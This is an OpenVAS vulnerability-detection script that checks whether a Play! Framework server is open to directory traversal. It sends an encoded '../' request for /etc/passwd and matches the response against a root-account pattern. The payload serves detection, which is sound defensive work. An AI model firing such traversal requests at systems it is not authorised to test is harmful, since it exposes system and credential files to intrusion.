###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_play_42340.nasl 8274 2018-01-03 07:28:17Z teissa $
#
# Play! Framework Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The Play! Framework is prone to a directory-traversal vulnerability
because it fails to sufficiently sanitize user-supplied input.

Remote attackers can use a specially crafted request with directory-
traversal sequences to read arbitrary files in the context of the user
running the affected application. Information obtained could aid in
further attacks.

Play! 1.0.3.1 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100757");
 script_version("$Revision: 8274 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-03 08:28:17 +0100 (Wed, 03 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-08-11 13:11:12 +0200 (Wed, 11 Aug 2010)");
 script_bugtraq_id(42340);

 script_name("Play! Framework Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/42340");
 script_xref(name : "URL" , value : "http://www.playframework.org/");

 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl", "http_version.nasl");
 script_mandatory_keys("Play_Framework/banner");
 script_require_ports("Services/www", 9000);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:9000);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "Server: Play! Framework" >!< banner)exit(0);

url = string("/public/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"); 

if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
